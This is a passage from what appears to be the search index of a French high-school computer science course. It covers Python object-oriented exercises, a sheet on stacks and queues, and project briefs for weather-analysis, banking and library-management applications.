Cr\u00e9er une fonction <code>afficher_aire(forme)</code> qui prend n'importe quelle forme en param\u00e8tre et affiche son aire. Exemple : <pre><code>cercle = Cercle(5)  # rayon = 5\ntriangle = Triangle(4, 3)  # base = 4, hauteur = 3\n\nafficher_aire(cercle)  # Affiche \"L'aire du cercle est de 78.54 unit\u00e9s carr\u00e9es\"\nafficher_aire(triangle)  # Affiche \"L'aire du triangle est de 6.0 unit\u00e9s carr\u00e9es\"\n</code></pre></p>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_exercices/#niveau-difficile","title":"Niveau Difficile","text":"<p>Syst\u00e8me de gestion d'employ\u00e9s \u2b50\u2b50\u2b50</p> <p>Cr\u00e9er un syst\u00e8me de gestion d'employ\u00e9s avec une classe de base <code>Employe</code> et des classes d\u00e9riv\u00e9es <code>Manager</code>, <code>Technicien</code> et <code>Commercial</code>. Chaque type d'employ\u00e9 a une m\u00e9thode diff\u00e9rente pour calculer son salaire. Impl\u00e9menter une classe <code>Entreprise</code> qui g\u00e8re une liste d'employ\u00e9s et peut calculer la masse salariale totale. Exemple : <pre><code>entreprise = Entreprise(\"TechCorp\")\n\nmanager = Manager(\"Alice Dupont\", 5)  # 5 ans d'exp\u00e9rience\ntechnicien = Technicien(\"Bob Martin\", 35)  # 35 heures par semaine\ncommercial = Commercial(\"Charlie Durand\", 50000)  # 50000\u20ac de ventes\n\nentreprise.ajouter_employe(manager)\nentreprise.ajouter_employe(technicien)\nentreprise.ajouter_employe(commercial)\n\nprint(f\"Masse salariale de {entreprise.nom}: {entreprise.calculer_masse_salariale()}\u20ac\")\n</code></pre></p> <p>Jeu de cartes \u2b50\u2b50\u2b50</p> <p>Impl\u00e9menter un syst\u00e8me de jeu de cartes avec des classes <code>Carte</code>, <code>Paquet</code>, et <code>Joueur</code>. La classe <code>Carte</code> a des attributs <code>valeur</code> et <code>couleur</code>. La classe <code>Paquet</code> contient une liste de cartes et des m\u00e9thodes pour m\u00e9langer et distribuer. La classe <code>Joueur</code> a une main de cartes et peut jouer des cartes. Exemple : <pre><code>paquet = Paquet()  # Cr\u00e9e un paquet standard de 52 cartes\npaquet.melanger()\n\njoueur1 = Joueur(\"Alice\")\njoueur2 = Joueur(\"Bob\")\n\npaquet.distribuer([joueur1, joueur2], 5)  # Distribue 5 cartes \u00e0 chaque joueur\n\njoueur1.afficher_main()\ncarte_jouee = joueur1.jouer_carte(0)  # Joue la premi\u00e8re carte de sa main\nprint(f\"{joueur1.nom} joue {carte_jouee}\")\n</code></pre></p> <p>Syst\u00e8me de r\u00e9servation \u2b50\u2b50\u2b50</p> <p>Cr\u00e9er un syst\u00e8me de r\u00e9servation pour un h\u00f4tel avec des classes <code>Client</code>, <code>Chambre</code>, <code>Reservation</code> et <code>Hotel</code>. Impl\u00e9menter des fonctionnalit\u00e9s pour v\u00e9rifier la disponibilit\u00e9 des chambres, effectuer des r\u00e9servations et calculer le co\u00fbt total d'un s\u00e9jour. Exemple : <pre><code>hotel = Hotel(\"Grand H\u00f4tel\")\n\n# Ajouter des chambres \u00e0 l'h\u00f4tel\nhotel.ajouter_chambre(Chambre(101, \"Simple\", 80))\nhotel.ajouter_chambre(Chambre(102, \"Double\", 120))\nhotel.ajouter_chambre(Chambre(103, \"Suite\", 200))\n\n# Cr\u00e9er un client\nclient = Client(\"Alice Dupont\", \"alice@example.com\")\n\n# V\u00e9rifier la disponibilit\u00e9 et faire une r\u00e9servation\nchambres_disponibles = hotel.verifier_disponibilite(\"2023-07-01\", \"2023-07-05\")\nif chambres_disponibles:\n    reservation = hotel.reserver_chambre(client, 102, \"2023-07-01\", \"2023-07-05\")\n    print(f\"R\u00e9servation confirm\u00e9e: {reservation}\")\n    print(f\"Co\u00fbt total: {reservation.calculer_cout()}\u20ac\")\n</code></pre></p>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_piles_files/","title":"Fiche de Cours : Piles et Files en Python (Impl\u00e9mentation POO)","text":""},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_piles_files/#1-introduction-aux-structures-lineaires","title":"1. Introduction aux Structures Lin\u00e9aires","text":"<p>Les piles (LIFO - Last In First Out) et les files (FIFO - First In First Out) sont des structures de donn\u00e9es fondamentales en informatique. Nous allons les impl\u00e9menter en Python en utilisant la Programmation Orient\u00e9e Objet.</p>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_piles_files/#2-le-type-de-donnees-abstrait-pile-stack","title":"2. Le Type de Donn\u00e9es Abstrait : Pile (Stack)","text":"<p>Une pile est une structure de donn\u00e9es lin\u00e9aire qui suit le principe LIFO (Last In, First Out - Dernier Entr\u00e9, Premier Sorti). Imaginez une pile d'assiettes : vous ne pouvez ajouter ou retirer une assiette que par le dessus.</p>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_piles_files/#operations-fondamentales","title":"Op\u00e9rations Fondamentales","text":"<p>Soit \\(P\\) une pile et \\(e\\) un \u00e9l\u00e9ment :</p> <ul> <li><code>creer_pile()</code> \u2192 Pile<ul> <li>Description : Cr\u00e9e une nouvelle pile vide.</li> <li>Axiome : <code>est_vide(creer_pile())</code> est Vrai.</li> </ul> </li> <li><code>empiler(P, e)</code> \u2192 Pile<ul> <li>Description : Ajoute \\(e\\) au sommet de la pile \\(P\\).</li> <li>Axiome : <code>sommet(empiler(P, e))</code> est \\(e\\).</li> <li>Axiome : <code>depiler(empiler(P, e))</code> est \\(e\\).</li> </ul> </li> <li><code>depiler(P)</code> \u2192 Pile<ul> <li>Description : Retire l'\u00e9l\u00e9ment au sommet de la pile \\(P\\) et le renvoie. Pr\u00e9condition : \\(P\\) ne doit pas \u00eatre vide.</li> <li>Exemple : Si \\(P = [e_1, e_2, e_3]\\), alors <code>depiler(P)</code> donne \\(P = [e_1, e_2]\\).</li> <li>Axiome : <code>depiler(empiler(creer_pile(), e))</code> est une pile vide.</li> </ul> </li> <li><code>sommet(P)</code> \u2192 Element<ul> <li>Description : Retourne l'\u00e9l\u00e9ment au sommet de la pile \\(P\\) sans le retirer. Pr\u00e9condition : \\(P\\) ne doit pas \u00eatre vide.</li> <li>Exemple : Si \\(P = [e_1, e_2, e_3]\\), alors <code>sommet(P)</code> retourne \\(e_3\\).</li> </ul> </li> <li><code>est_vide(P)</code> \u2192 Bool\u00e9en<ul> <li>Description : Retourne Vrai si la pile \\(P\\) est vide, Faux sinon.</li> </ul> </li> </ul>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_piles_files/#comportement-dune-pile-exemple-conceptuel","title":"Comportement d'une Pile (Exemple Conceptuel)","text":"<p>Supposons que nous ayons une pile <code>P</code> initialement vide (<code>P = creer_pile()</code>): 1. <code>empiler(P, 10)</code>  =&gt; La pile \\(P\\) devient <code>[10]</code> (10 est au sommet) 2. <code>empiler(P, 20)</code>  =&gt; La pile \\(P\\) devient <code>[10, 20]</code> (20 est au sommet) 3. <code>sommet(P)</code>       =&gt; Retourne <code>20</code> (la pile \\(P\\) reste <code>[10, 20]</code>) 4. <code>depiler(P)</code>      =&gt; La pile \\(P\\) devient <code>[10]</code>. L'op\u00e9ration retourne <code>20</code>. 5. <code>est_vide(P)</code>     =&gt; Retourne <code>Faux</code> 6. <code>depiler(P)</code>      =&gt; La pile \\(P\\) devient <code>[]</code>. L'op\u00e9ration retourne <code>10</code>. 7. <code>est_vide(P)</code>     =&gt; Retourne <code>Vrai</code></p>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_piles_files/#3-le-type-de-donnees-abstrait-file-queue","title":"3. Le Type de Donn\u00e9es Abstrait : File (Queue)","text":"<p>Une file est une structure de donn\u00e9es lin\u00e9aire qui suit le principe FIFO (First In, First Out - Premier Entr\u00e9, Premier Sorti). Pensez \u00e0 une file d'attente au cin\u00e9ma : la premi\u00e8re personne arriv\u00e9e est la premi\u00e8re servie.</p>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_piles_files/#operations-fondamentales_1","title":"Op\u00e9rations Fondamentales","text":"<p>Soit \\(F\\) une file et \\(e\\) un \u00e9l\u00e9ment :</p> <ul> <li><code>creer_file()</code> \u2192 File<ul> <li>Description : Cr\u00e9e une nouvelle file vide.</li> <li>Axiome : <code>est_vide(creer_file())</code> est Vrai.</li> </ul> </li> <li><code>enfiler(F, e)</code> \u2192 File<ul> <li>Description : Ajoute \\(e\\) \u00e0 la fin (queue) de la file \\(F\\).</li> <li>Exemple : Si \\(F = [e_1, e_2]\\), alors <code>enfiler(F, e_3)</code> donne \\(F = [e_1, e_2, e_3]\\).</li> <li>Axiome : <code>est_vide(enfiler(F, e))</code> est Faux.</li> <li>Axiome (si \\(F\\) est vide) : <code>tete(enfiler(creer_file(), e))</code> est \\(e\\).</li> <li>Axiome (si \\(F\\) n'est pas vide) : <code>tete(enfiler(F, e))</code> est <code>tete(F)</code>.</li> </ul> </li> <li><code>defiler(F)</code> \u2192 File<ul> <li>Description : Retire l'\u00e9l\u00e9ment en t\u00eate de la file \\(F\\) et le renvoie. Pr\u00e9condition : \\(F\\) ne doit pas \u00eatre vide.</li> <li>Exemple : Si \\(F = [e_1, e_2, e_3]\\), alors <code>defiler(F)</code> donne \\(F = [e_2, e_3]\\).</li> <li>Axiome : <code>defiler(enfiler(creer_file(), e))</code> est e.</li> </ul> </li> <li><code>tete(F)</code> \u2192 Element<ul> <li>Description : Retourne l'\u00e9l\u00e9ment en t\u00eate de la file \\(F\\) sans le retirer. Pr\u00e9condition : \\(F\\) ne doit pas \u00eatre vide.</li> <li>Exemple : Si \\(F = [e_1, e_2, e_3]\\), alors <code>tete(F)</code> retourne \\(e_1\\).</li> </ul> </li> <li><code>est_vide(F)</code> \u2192 Bool\u00e9en<ul> <li>Description : Retourne Vrai si la file \\(F\\) est vide, Faux sinon.</li> </ul> </li> </ul>"},{"location":"premiere/XIII-Projets/","title":"\ud83c\udfa8 Projets NSI","text":"\ud83c\udfe6 Application Bancaire Sujet Code source \u26a1 PokeNSI Sujet Code source \ud83d\udcda Gestion Biblioth\u00e8que Sujet \ud83c\udfae Gestion Jeux Vid\u00e9o Sujet Code source \ud83d\uded2 Gestion Stock Sujet \u26bd Tournoi Sportif Sujet \ud83d\udcd6 Jeu Aventure Sujet \ud83c\udf10 R\u00e9seau Social Sujet \ud83c\udf26\ufe0f M\u00e9t\u00e9o Analyse Sujet"},{"location":"premiere/XIII-Projets/App_Meteo_Analyse/sujet/","title":"Projet - Application M\u00e9t\u00e9o avec Analyse de Donn\u00e9es \ud83c\udf26\ufe0f\ud83d\udcca","text":"<p>Ce projet consiste \u00e0 cr\u00e9er une application qui r\u00e9cup\u00e8re des donn\u00e9es m\u00e9t\u00e9orologiques (simul\u00e9es ou r\u00e9elles via une API simple), les stocke, et permet d'effectuer des analyses simples (temp\u00e9rature moyenne, jours de pluie, etc.).</p>"},{"location":"premiere/XIII-Projets/App_Meteo_Analyse/sujet/#concepts-abordes","title":"Concepts Abord\u00e9s","text":"<ul> <li>Structures de donn\u00e9es : listes de dictionnaires pour les relev\u00e9s m\u00e9t\u00e9o.</li> <li>Manipulation de fichiers (CSV ou JSON pour stocker les donn\u00e9es).</li> <li>Traitement de donn\u00e9es : calcul de moyennes, comptages, recherche de min/max.</li> <li>Utilisation de dates (module <code>datetime</code>).</li> <li>Fonctions pour organiser les op\u00e9rations.</li> <li>(Optionnel) Interaction avec une API web simple pour r\u00e9cup\u00e9rer des donn\u00e9es r\u00e9elles.</li> </ul>"},{"location":"premiere/XIII-Projets/App_Meteo_Analyse/sujet/#fonctionnalites-a-implementer","title":"Fonctionnalit\u00e9s \u00e0 Impl\u00e9menter","text":""},{"location":"premiere/XIII-Projets/App_Meteo_Analyse/sujet/#1-structure-et-stockage-des-donnees-meteo","title":"1. Structure et Stockage des Donn\u00e9es M\u00e9t\u00e9o","text":"<p>Chaque relev\u00e9 m\u00e9t\u00e9o concernera une date sp\u00e9cifique.</p> <p>Structure d'un relev\u00e9 m\u00e9t\u00e9o</p> <p>D\u00e9finir une structure pour un relev\u00e9 m\u00e9t\u00e9o quotidien. Un dictionnaire est adapt\u00e9 : - <code>date</code> (cha\u00eene de caract\u00e8res au format AAAA-MM-JJ ou objet <code>date</code>) - <code>temperature_max</code> (flottant, en \u00b0C) - <code>temperature_min</code> (flottant, en \u00b0C) - <code>precipitation_mm</code> (flottant, quantit\u00e9 de pluie en mm) - <code>description_temps</code> (cha\u00eene de caract\u00e8res, ex: \"Ensoleill\u00e9\", \"Nuageux\", \"Pluie l\u00e9g\u00e8re\")</p> <p>Base de donn\u00e9es des relev\u00e9s</p> <p>Cr\u00e9er une liste globale <code>releves_meteo</code> pour stocker tous les relev\u00e9s.</p> <p>Ajouter un relev\u00e9 m\u00e9t\u00e9o</p> <p>Cr\u00e9er une fonction <code>ajouter_releve(releves_meteo, date_str, temp_max, temp_min, precip, desc)</code> qui : 1. V\u00e9rifie si un relev\u00e9 pour <code>date_str</code> existe d\u00e9j\u00e0. 2. Convertit <code>date_str</code> en un format de date standard (si ce n'est pas d\u00e9j\u00e0 fait). 3. Cr\u00e9e un dictionnaire de relev\u00e9 et l'ajoute \u00e0 <code>releves_meteo</code>. 4. Renvoie <code>True</code> si ajout\u00e9, <code>False</code> sinon (date d\u00e9j\u00e0 pr\u00e9sente). Pensez \u00e0 la validation des types de donn\u00e9es (ex: temp\u00e9ratures sont des nombres).</p> <p>Sauvegarde et Chargement des relev\u00e9s</p> <ul> <li>Cr\u00e9er une fonction <code>sauvegarder_releves(releves_meteo, nom_fichier)</code> pour sauvegarder la liste <code>releves_meteo</code> dans un fichier CSV ou JSON.</li> <li>Cr\u00e9er une fonction <code>charger_releves(nom_fichier)</code> pour charger les relev\u00e9s depuis le fichier au d\u00e9marrage de l'application. Si le fichier n'existe pas, retourner une liste vide. Attention \u00e0 la conversion des types lors du chargement (surtout pour les dates et les nombres).</li> </ul> <p>Tests de la gestion des donn\u00e9es</p> <ol> <li>Initialiser <code>releves_meteo</code> (ou chargez depuis un fichier vide).</li> <li>Ajouter manuellement plusieurs relev\u00e9s pour diff\u00e9rentes dates.</li> <li>Essayer d'ajouter un relev\u00e9 pour une date existante.</li> <li>Sauvegarder les relev\u00e9s.</li> <li>Red\u00e9marrer le script (ou effacez la variable) et charger les relev\u00e9s. V\u00e9rifier qu'ils sont corrects.</li> </ol>"},{"location":"premiere/XIII-Projets/App_Meteo_Analyse/sujet/#2-saisie-manuelle-des-donnees","title":"2. Saisie Manuelle des Donn\u00e9es","text":"<p>Interface de saisie</p> <p>Cr\u00e9er une fonction qui permet \u00e0 l'utilisateur de saisir les informations pour un nouveau relev\u00e9 m\u00e9t\u00e9o (date, temp\u00e9ratures, pr\u00e9cipitations, description). Cette fonction appellera <code>ajouter_releve</code>. S'assurer de g\u00e9rer les erreurs de saisie (par exemple, si l'utilisateur entre du texte pour une temp\u00e9rature).</p>"},{"location":"premiere/XIII-Projets/App_Meteo_Analyse/sujet/#3-analyse-des-donnees-meteo","title":"3. Analyse des Donn\u00e9es M\u00e9t\u00e9o","text":"<p>Temp\u00e9rature moyenne pour une p\u00e9riode</p> <p>Cr\u00e9er une fonction <code>temperature_moyenne_periode(releves_meteo, date_debut_str, date_fin_str)</code> qui : 1. Filtre les relev\u00e9s compris entre <code>date_debut_str</code> et <code>date_fin_str</code> (incluses). 2. Calcule la temp\u00e9rature moyenne ((temp_max + temp_min) / 2) pour chaque jour s\u00e9lectionn\u00e9. 3. Renvoie la moyenne de ces temp\u00e9ratures moyennes journali\u00e8res. Si aucun relev\u00e9 n'est trouv\u00e9 pour la p\u00e9riode, renvoyez <code>None</code> ou un message appropri\u00e9.</p> <p>Jour le plus chaud / froid sur une p\u00e9riode</p> <p>Cr\u00e9er deux fonctions : - <code>jour_plus_chaud(releves_meteo, date_debut_str, date_fin_str)</code> : renvoie le dictionnaire du relev\u00e9 avec la <code>temperature_max</code> la plus \u00e9lev\u00e9e dans la p\u00e9riode. - <code>jour_plus_froid(releves_meteo, date_debut_str, date_fin_str)</code> : renvoie le dictionnaire du relev\u00e9 avec la <code>temperature_min</code> la plus basse dans la p\u00e9riode.</p> <p>Nombre de jours de pluie et total pr\u00e9cipitations</p> <p>Cr\u00e9er une fonction <code>stats_precipitation_periode(releves_meteo, date_debut_str, date_fin_str)</code> qui : 1. Filtre les relev\u00e9s pour la p\u00e9riode donn\u00e9e. 2. Compte le nombre de jours o\u00f9 <code>precipitation_mm &gt; 0</code>. 3. Calcule le total des <code>precipitation_mm</code> sur ces jours de pluie. 4. Renvoie ces deux valeurs (par exemple, sous forme de tuple ou de dictionnaire).</p> <p>Afficher les relev\u00e9s pour un jour donn\u00e9</p> <p>Cr\u00e9er une fonction <code>afficher_releve_jour(releves_meteo, date_str)</code> qui recherche et affiche de mani\u00e8re format\u00e9e le relev\u00e9 m\u00e9t\u00e9o pour la <code>date_str</code> sp\u00e9cifi\u00e9e, ou un message si aucun relev\u00e9 n'est trouv\u00e9.</p> <p>Tests des analyses</p> <p>Apr\u00e8s avoir saisi ou charg\u00e9 un ensemble de donn\u00e9es de test (par exemple, pour un mois complet) : 1. Calculer la temp\u00e9rature moyenne pour ce mois. 2. Trouver le jour le plus chaud et le jour le plus froid du mois. 3. Calculer le nombre de jours de pluie et le total des pr\u00e9cipitations pour le mois. 4. Afficher les donn\u00e9es pour un jour sp\u00e9cifique.</p>"},{"location":"premiere/XIII-Projets/App_Meteo_Analyse/sujet/#4-interface-utilisateur","title":"4. Interface Utilisateur","text":"<p>Menu principal</p> <p>Cr\u00e9er une interface en mode texte pour permettre \u00e0 l'utilisateur de : 1. Ajouter un nouveau relev\u00e9 m\u00e9t\u00e9o. 2. Afficher le relev\u00e9 pour un jour sp\u00e9cifique. 3. Afficher les statistiques pour une p\u00e9riode (temp\u00e9rature moyenne, jour le plus chaud/froid, stats de pluie). 4. Sauvegarder les donn\u00e9es (si non automatique \u00e0 chaque ajout). 5. Quitter.</p> <p>Test de l'application compl\u00e8te</p> <ol> <li>Lancer l'application. Charger des donn\u00e9es existantes s'il y en a, sinon commencer avec une base vide.</li> <li>Ajouter quelques relev\u00e9s pour plusieurs jours.</li> <li>Demander des statistiques pour diff\u00e9rentes p\u00e9riodes.</li> <li>Afficher des relev\u00e9s sp\u00e9cifiques.</li> <li>Sauvegarder et quitter. Relancer pour v\u00e9rifier la persistance.</li> </ol>"},{"location":"premiere/XIII-Projets/App_Meteo_Analyse/sujet/#pour-aller-plus-loin-optionnel","title":"Pour aller plus loin (Optionnel)","text":"<ul> <li>Graphiques simples : Utilisez une biblioth\u00e8que comme <code>matplotlib</code> (si autoris\u00e9e et install\u00e9e) pour tracer des graphiques simples (\u00e9volution des temp\u00e9ratures, histogramme des pr\u00e9cipitations).</li> <li>R\u00e9cup\u00e9ration de donn\u00e9es r\u00e9elles : Utilisez une API m\u00e9t\u00e9o gratuite (comme OpenWeatherMap, n\u00e9cessite une cl\u00e9 API) pour r\u00e9cup\u00e9rer les donn\u00e9es d'aujourd'hui ou des pr\u00e9visions. Cela introduirait la gestion des requ\u00eates HTTP (module <code>requests</code>) et l'analyse de JSON complexe.</li> <li>Pr\u00e9visions basiques : Si vous avez suffisamment de donn\u00e9es historiques, essayez de calculer des moyennes saisonni\u00e8res pour \"pr\u00e9dire\" grossi\u00e8rement le temps.</li> <li>Alertes m\u00e9t\u00e9o : D\u00e9finir des seuils (temp\u00e9rature tr\u00e8s \u00e9lev\u00e9e, fortes pluies) et afficher des alertes si les donn\u00e9es r\u00e9centes les d\u00e9passent.</li> </ul>"},{"location":"premiere/XIII-Projets/Application_bancaire/sujet/","title":"Projet - Application Bancaire Simple","text":"<p>Le but de ce projet est de cr\u00e9er une application bancaire simple en utilisant Python. Nous allons nous concentrer sur la gestion des comptes bancaires et des transactions en utilisant les dictionnaires.</p>"},{"location":"premiere/XIII-Projets/Application_bancaire/sujet/#le-systeme-de-comptes","title":"Le syst\u00e8me de comptes","text":"<p>Chaque compte bancaire poss\u00e8de les caract\u00e9ristiques suivantes : - nom (cha\u00eene de caract\u00e8res) - solde (nombre d\u00e9cimal) - transactions (liste des op\u00e9rations effectu\u00e9es)</p>"},{"location":"premiere/XIII-Projets/Application_bancaire/sujet/#creation-du-systeme-de-comptes","title":"Cr\u00e9ation du syst\u00e8me de comptes","text":"<p>Base de donn\u00e9es des comptes</p> <p>Cr\u00e9er un dictionnaire vide <code>comptes</code> qui contiendra tous les comptes bancaires.</p> <p>Cr\u00e9ation de compte</p> <p>Cr\u00e9er la fonction <code>creer_compte</code> qui prend en param\u00e8tres : - un num\u00e9ro de compte (str) - un nom (str) - un solde initial (float, valeur par d\u00e9faut : 0) - une liste vide <code>transactions</code> qui correspond aux transactions. Cette fonction ajoute dans le dictionnaires des comptes, un nouveau dictionnaire avec pour clef le num\u00e9ro de compte et comme valeurs un autre dictionnaire contenant toutes les informations necessaires. La fonction doit v\u00e9rifier si le compte n'existe pas d\u00e9j\u00e0 avant de le cr\u00e9er.</p>"},{"location":"premiere/XIII-Projets/Application_bancaire/sujet/#les-operations-bancaires","title":"Les op\u00e9rations bancaires","text":""},{"location":"premiere/XIII-Projets/Application_bancaire/sujet/#gestion-des-transactions","title":"Gestion des transactions","text":"<p>D\u00e9p\u00f4t d'argent</p> <p>Cr\u00e9er la fonction <code>deposer</code> qui prend en param\u00e8tres : - un num\u00e9ro de compte (str) - un montant \u00e0 d\u00e9poser (float)</p> <p>La fonction doit : 1. V\u00e9rifier que le compte existe 2. Ajouter le montant au solde 3. Enregistrer la transaction dans l'historique</p> <p>Retrait d'argent</p> <p>Cr\u00e9er la fonction <code>retirer</code> qui prend en param\u00e8tres : - un num\u00e9ro de compte (str) - un montant \u00e0 retirer (float)</p> <p>La fonction doit : 1. V\u00e9rifier que le compte existe 2. V\u00e9rifier que le solde est suffisant 3. Retirer le montant du solde 4. Enregistrer la transaction dans l'historique</p>"},{"location":"premiere/XIII-Projets/Application_bancaire/sujet/#consultation-des-informations","title":"Consultation des informations","text":"<p>V\u00e9rification du solde</p> <p>Cr\u00e9er la fonction <code>verifier_solde</code> qui prend en param\u00e8tre un num\u00e9ro de compte (str) et affiche le solde actuel du compte.</p> <p>Historique des transactions</p> <p>Cr\u00e9er la fonction <code>voir_transactions</code> qui prend en param\u00e8tre un num\u00e9ro de compte (str) et affiche l'historique des transactions du compte.</p>"},{"location":"premiere/XIII-Projets/Application_bancaire/sujet/#interface-utilisateur","title":"Interface utilisateur","text":"<p>Menu principal</p> <p>Cr\u00e9er la fonction <code>afficher_menu</code> qui affiche les options disponibles : 1. Cr\u00e9er un compte 2. Faire un d\u00e9p\u00f4t 3. Faire un retrait 4. V\u00e9rifier le solde 5. Voir les transactions 6. Quitter</p> <p>Boucle principale</p> <p>Cr\u00e9er la fonction <code>main</code> qui g\u00e8re l'interaction avec l'utilisateur : - Afficher le menu - G\u00e9rer les choix de l'utilisateur - G\u00e9rer les erreurs de saisie - Permettre de quitter proprement l'application</p> <p>Test de l'application</p> <p>Tester le bon fonctionnement de l'application : 1. Cr\u00e9er un compte pour Alice avec 1000\u20ac 2. Cr\u00e9er un compte pour Bob avec 500\u20ac 3. Faire un d\u00e9p\u00f4t de 200\u20ac sur le compte d'Alice 4. Faire un retrait de 50\u20ac sur le compte d'Alice 5. V\u00e9rifier le solde d'Alice 6. Afficher l'historique des transactions d'Alice 7. Tester la gestion des erreurs :     - Retrait avec solde insuffisant     - Acc\u00e8s \u00e0 un compte inexistant     - Saisie de montants invalides</p>"},{"location":"premiere/XIII-Projets/Gestion_Bibliotheque_Numerique/sujet/","title":"Projet - Syst\u00e8me de Gestion de Biblioth\u00e8que Num\u00e9rique \ud83d\udcda","text":"<p>Le but de ce projet est de cr\u00e9er un syst\u00e8me en Python pour g\u00e9rer une collection de livres num\u00e9riques.</p>"},{"location":"premiere/XIII-Projets/Gestion_Bibliotheque_Numerique/sujet/#concepts-abordes","title":"Concepts Abord\u00e9s","text":"<ul> <li>Structures de donn\u00e9es : listes, dictionnaires</li> <li>Manipulation de fichiers (CSV ou JSON pour stocker les donn\u00e9es des livres)</li> <li>Fonctions : d\u00e9finition, appel, param\u00e8tres, valeurs de retour</li> <li>Boucles et conditions</li> <li>Interfaces utilisateur simples en mode texte</li> </ul>"},{"location":"premiere/XIII-Projets/Gestion_Bibliotheque_Numerique/sujet/#fonctionnalites-a-implementer","title":"Fonctionnalit\u00e9s \u00e0 Impl\u00e9menter","text":""},{"location":"premiere/XIII-Projets/Gestion_Bibliotheque_Numerique/sujet/#1-gestion-des-livres","title":"1. Gestion des Livres","text":"<p>Chaque livre sera repr\u00e9sent\u00e9 par un dictionnaire avec les cl\u00e9s suivantes : - <code>titre</code> (cha\u00eene de caract\u00e8res) - <code>auteur</code> (cha\u00eene de caract\u00e8res) - <code>annee_publication</code> (entier) - <code>genre</code> (cha\u00eene de caract\u00e8res) - <code>isbn</code> (cha\u00eene de caract\u00e8res, unique)</p> <p>Initialisation de la biblioth\u00e8que</p> <p>Cr\u00e9er une liste vide nomm\u00e9e <code>bibliotheque</code> qui contiendra tous les dictionnaires repr\u00e9sentant les livres.</p> <p>Ajout d'un livre</p> <p>Cr\u00e9er une fonction <code>ajouter_livre(bibliotheque, titre, auteur, annee_publication, genre, isbn)</code> qui : 1. V\u00e9rifie si un livre avec le m\u00eame ISBN existe d\u00e9j\u00e0 dans la <code>bibliotheque</code>. 2. Si non, cr\u00e9e un dictionnaire pour le nouveau livre et l'ajoute \u00e0 la liste <code>bibliotheque</code>. 3. Renvoie <code>True</code> si le livre a \u00e9t\u00e9 ajout\u00e9, <code>False</code> sinon (par exemple, si l'ISBN existe d\u00e9j\u00e0).</p> <p>Recherche de livres</p> <p>Cr\u00e9er une fonction <code>rechercher_livres(bibliotheque, critere, valeur)</code> qui : 1. Prend en param\u00e8tre la <code>bibliotheque</code>, un <code>critere</code> de recherche (par exemple, \"titre\", \"auteur\", \"genre\") et une <code>valeur</code> \u00e0 rechercher. 2. Renvoie une liste de tous les livres (dictionnaires) qui correspondent au crit\u00e8re et \u00e0 la valeur. Par exemple, <code>rechercher_livres(bibliotheque, \"auteur\", \"Victor Hugo\")</code> devrait renvoyer tous les livres de Victor Hugo.</p> <p>Affichage des d\u00e9tails d'un livre</p> <p>Cr\u00e9er une fonction <code>afficher_details_livre(livre)</code> qui prend un dictionnaire de livre en param\u00e8tre et affiche ses informations de mani\u00e8re lisible.</p> <p>Tests de la gestion des livres</p> <ol> <li>Initialiser une biblioth\u00e8que vide.</li> <li>Ajouter plusieurs livres avec des informations vari\u00e9es. Tenter d'ajouter un livre avec un ISBN d\u00e9j\u00e0 existant pour v\u00e9rifier la gestion des doublons.</li> <li>Rechercher des livres par titre, auteur et genre.</li> <li>Afficher les d\u00e9tails des livres trouv\u00e9s.</li> </ol>"},{"location":"premiere/XIII-Projets/Gestion_Bibliotheque_Numerique/sujet/#2-sauvegarde-et-chargement-des-donnees","title":"2. Sauvegarde et Chargement des Donn\u00e9es","text":"<p>Pour que les donn\u00e9es persistent entre les sessions, nous allons les sauvegarder dans un fichier.</p> <p>Sauvegarde de la biblioth\u00e8que</p> <p>Cr\u00e9er une fonction <code>sauvegarder_bibliotheque(bibliotheque, nom_fichier)</code> qui : 1. Prend la liste <code>bibliotheque</code> et un <code>nom_fichier</code> (par exemple, \"bibliotheque.csv\") en param\u00e8tres. 2. \u00c9crit les donn\u00e9es de chaque livre dans le fichier CSV. Chaque ligne du CSV repr\u00e9sentera un livre, et les colonnes correspondront aux attributs du livre (titre, auteur, etc.). Astuce : Vous pouvez utiliser le module <code>csv</code> de Python pour cela.</p> <p>Chargement de la biblioth\u00e8que</p> <p>Cr\u00e9er une fonction <code>charger_bibliotheque(nom_fichier)</code> qui : 1. Prend un <code>nom_fichier</code> en param\u00e8tre. 2. Lit les donn\u00e9es depuis le fichier CSV et reconstruit la liste de dictionnaires <code>bibliotheque</code>. 3. Renvoie la <code>bibliotheque</code> charg\u00e9e. Si le fichier n'existe pas, elle doit renvoyer une liste vide. Attention \u00e0 bien convertir les types de donn\u00e9es (par exemple, <code>annee_publication</code> en entier) lors du chargement.</p> <p>Tests de sauvegarde et chargement</p> <ol> <li>Cr\u00e9er une biblioth\u00e8que et y ajouter quelques livres.</li> <li>Sauvegarder la biblioth\u00e8que dans un fichier.</li> <li>Effacer la variable <code>bibliotheque</code> actuelle (ou red\u00e9marrez votre script).</li> <li>Charger la biblioth\u00e8que depuis le fichier et v\u00e9rifier que tous les livres sont correctement restaur\u00e9s.</li> </ol>"},{"location":"premiere/XIII-Projets/Gestion_Bibliotheque_Numerique/sujet/#3-interface-utilisateur-menu-principal","title":"3. Interface Utilisateur (Menu Principal)","text":"<p>Cr\u00e9er une interface simple en mode texte pour interagir avec le syst\u00e8me.</p> <p>Menu principal</p> <p>Cr\u00e9er une fonction <code>menu_principal()</code> qui affiche les options suivantes \u00e0 l'utilisateur : 1. Ajouter un nouveau livre 2. Rechercher des livres 3. Afficher tous les livres 4. Supprimer un livre (par ISBN) 5. Sauvegarder et quitter 6. Quitter sans sauvegarder</p> <p>La fonction doit lire le choix de l'utilisateur et appeler les fonctions correspondantes. La boucle du menu doit continuer jusqu'\u00e0 ce que l'utilisateur choisisse de quitter.</p> <p>Suppression d'un livre</p> <p>Cr\u00e9er une fonction <code>supprimer_livre(bibliotheque, isbn)</code> qui : 1. Recherche le livre par <code>isbn</code>. 2. Si trouv\u00e9, le supprime de la <code>bibliotheque</code> et renvoie <code>True</code>. 3. Sinon, renvoie <code>False</code>.</p> <p>Test de 